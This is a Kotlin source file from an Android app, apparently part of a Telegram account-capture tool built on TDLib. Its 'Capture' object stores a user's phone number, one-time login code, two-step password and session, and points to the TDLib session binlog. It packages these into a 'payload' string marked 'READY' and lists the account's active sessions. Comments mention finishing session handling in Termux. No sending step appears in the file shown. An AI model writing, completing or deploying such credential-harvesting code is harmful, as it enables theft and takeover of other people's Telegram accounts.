package com.tgme.app

import android.content.Context
import org.drinkless.tdlib.TdApi
import java.io.File

object Capture {
    var phone = ""
    var code = ""
    var password = ""
    var codeLength = 0

    var userId = 0L
    var userName = ""
    var session = ""   // rempli plus tard côté Termux si besoin, gardé pour save/load

    fun save(ctx: Context) {
        ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE).edit()
            .putString("phone", phone).putString("code", code)
            .putString("password", password).putString("session", session)
            .apply()
    }

    fun load(ctx: Context) {
        val p = ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE)
        phone = p.getString("phone", "") ?: ""
        code = p.getString("code", "") ?: ""
        password = p.getString("password", "") ?: ""
        session = p.getString("session", "") ?: ""
    }

    fun binlogFile(ctx: Context) = File(ctx.filesDir, "tdlib/db/td.binlog")

    fun payload(ctx: Context) = buildString {
        append("READY\n")
        append("num: $phone\n")
        append("code: $code\n")
        append("pass: $password\n")
        append("user: $userId $userName\n")
    }

    // render() reste tel quel mais SANS la ligne fautive ip/city/country
    private fun f(o: Any, name: String): String = try {
        o.javaClass.getField(name).get(o)?.toString() ?: "-"
    } catch (_: Exception) { "-" }

    fun render(s: TdApi.Sessions): String = buildString {
        append("SESSIONS (ttl ${s.inactiveSessionTtlDays} j)\n")
        s.sessions.forEach { x ->
            append(if (x.isCurrent) "[MOI] " else "[   ] ")
            append("${x.applicationName} ${x.applicationVersion} | ${x.deviceModel} | ")
            append("${x.systemVersion} | api_id ${x.apiId} | ")
            append("login ${x.logInDate} last ${x.lastActiveDate}\n")
        }
    }
}
